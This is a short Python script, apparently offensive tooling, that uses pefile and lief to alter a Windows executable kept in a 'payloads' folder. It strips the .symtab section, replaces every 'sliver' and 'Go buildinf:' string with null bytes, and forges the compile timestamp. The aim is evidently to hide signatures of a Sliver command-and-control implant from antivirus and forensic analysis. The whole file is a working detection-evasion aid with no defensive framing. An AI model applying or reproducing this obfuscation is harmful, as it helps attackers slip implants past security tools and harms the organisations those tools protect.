import pefile
import lief

file_name = 'workbench/original.exe'
output_file_name = 'payloads/modified.exe'
print('Reading PE file...')
binary = lief.parse(file_name)
# Remove .symtab section
print('Removing .symtab section...')
binary.remove_section('.symtab')
binary.write(output_file_name)
with open(output_file_name,"rb") as f:
  raw = f.read()
# replace "Go buildinf:" string with null bytes
print('Removing Go buildinf string...')
raw = raw.replace( 
  b'\x47\x6F\x20\x62\x75\x69\x6C\x64\x69\x6E\x66\x3A',
  b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
)
# replace "sliver" strings with null bytes
print('Removing sliver strings...')
raw = raw.replace(
  b'\x73\x6C\x69\x76\x65\x72',
  b'\x00\x00\x00\x00\x00\x00'
)
with open(output_file_name,"wb") as f:
  f.write(raw)

pe = pefile.PE(output_file_name)
# set compiler timestamp to: Sat 1 January 2022 12:00:00 UTC
print('Setting compiler timstamp to: Sat 1 January 2022 12:00:00 UTC')
pe.FILE_HEADER.TimeDateStamp = 1641038400
pe.write(output_file_name) 
print('Done.')
